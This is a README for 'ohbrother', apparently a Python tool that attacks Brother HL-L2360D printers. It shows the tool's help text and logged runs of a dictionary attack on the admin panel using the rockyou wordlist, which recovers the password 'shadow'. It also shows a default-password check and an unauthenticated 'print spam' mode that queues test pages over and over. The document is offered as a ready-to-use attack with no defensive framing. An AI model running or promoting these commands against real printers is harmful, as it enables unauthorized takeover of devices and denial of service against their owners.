# ohbrother
Brother Printer Admin Panel Dictionary attack tool (Designed for the HL-L2360D series)
```
usage: ohbrother.py [-h] --ip-address IP_ADDRESS [--port PORT] [--wordlist WORDLIST]

Brother Printer Admin Panel Dictionary attack (Designed for the HL-L2360D series)

options:
  -h, --help            show this help message and exit
  --ip-address IP_ADDRESS, -i IP_ADDRESS
                        IP Address of the printer
  --port PORT, -p PORT  Port the admin interface is running on (default: 80)
  --dictionary-attack DICTIONARY_ATTACK, -D DICTIONARY_ATTACK
                        IP Address of the printer
  --print-spam, -S      continuously print test pages (unauthenticated)
  --wordlist WORDLIST, -W WORDLIST
                        Wordlist to use to attack the printer (default:
                        /usr/share/wordlists/rockyou.txt)
```

# Usage

## Dictionary Attack
Dictionary attack using the default wordlist
```
┌──(kali㉿kali)-[~]
└─$ python3 ohbrother.py --ip-address 192.168.0.77
[00:15:05] {/home/kali/ohbrother.py:60} INFO - [*] Starting a dictionary attack on http://192.168.0.77:80/general/status.html
[00:16:19] {/home/kali/ohbrother.py:66} INFO - [*] found correct password: shadow
```
Ohbrother checks for common default brother passwords

```
C:\Users\DrewQ\Desktop\Brother>python main.py --wordlist "C:\Users\DrewQ\Downloads\passwords.txt" --ip-address 192.168.0.77
[23:14:00] {C:\Users\DrewQ\Desktop\Brother\main.py:49} INFO - [*] default password was set: initpas
```

## Print Spam
```
C:\Users\DrewQ\Desktop\Brother>python ohbrother.py --print-spam initpass --ip-address 192.168.0.77
[23:41:13] INFO - [*] queued a test page
[23:41:16] INFO - [*] queued a test page
[23:41:19] INFO - [*] queued a test page
```
